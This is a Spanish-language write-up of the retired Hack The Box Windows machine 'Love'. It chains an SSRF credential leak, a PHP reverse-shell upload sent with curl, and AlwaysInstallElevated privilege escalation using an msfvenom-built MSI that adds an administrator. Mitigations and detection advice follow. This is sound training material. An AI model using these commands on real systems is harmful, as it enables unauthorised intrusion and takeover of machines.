---
machine: Love
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, ssrf, file-upload, alwaysinstallelevated, msi]
---

# Love — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un escáner SSRF en `staging.love.htb` alcanza un panel interno en `localhost` y filtra credenciales de administrador. El sistema de votaciones permite subir un archivo y ejecutar PHP. La escalada es `AlwaysInstallElevated`: un MSI malicioso se instala como SYSTEM.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,443,445,5985 <IP>
```

- IIS, SMB y WinRM.
- Vhosts `love.htb` y `staging.love.htb`.

## Enumeración

```bash
ffuf -u http://<IP>/ -H 'Host: FUZZ.love.htb' -w subdomains.txt
```

`staging.love.htb` ofrece un escáner de URLs. Al apuntar a `http://localhost:5000` devuelve un panel con credenciales.

## Foothold

Con las credenciales se accede al sistema de votaciones. La subida no valida el contenido: se sube un PHP con una reverse shell y se visita la ruta pública.

```bash
curl -s -F "file=@shell.php" http://<IP>/upload.php
```

La shell corre como el usuario del servicio web.

## Movimiento lateral

Se enumeran usuarios, shares y permisos. Las credenciales del panel permiten reutilizar el acceso en WinRM.

## Escalada de privilegios

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ambas claves valen `1`. Se genera un MSI que añade un usuario administrador y se instala:

```bash
msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Evidencia

- Respuesta del escáner SSRF con credenciales redactadas.
- Subida y ejecución del PHP.
- Consultas del registro con valor `1`.
- `whoami /groups` como SYSTEM.

## Lecciones aprendidas

- Un SSRF interno puede exponer paneles sin autenticación.
- Validar solo la extensión no impide subir código.
- `AlwaysInstallElevated` convierte a cualquier usuario en SYSTEM.

## Mitigaciones y detección

- Restringir el escáner a destinos externos y autenticar paneles internos.
- Validar tipo real, nombre y contenido de las subidas.
- Deshabilitar `AlwaysInstallElevated` en ambas ramas del registro.
- Alertar de `msiexec` lanzado por usuarios estándar y de subidas PHP.

## Referencias

- <https://www.hackthebox.com/machines/Love>
- <https://0xdf.gitlab.io/2021/05/01/htb-love.html>
- <https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated>
- <https://attack.mitre.org/techniques/T1548/002/>
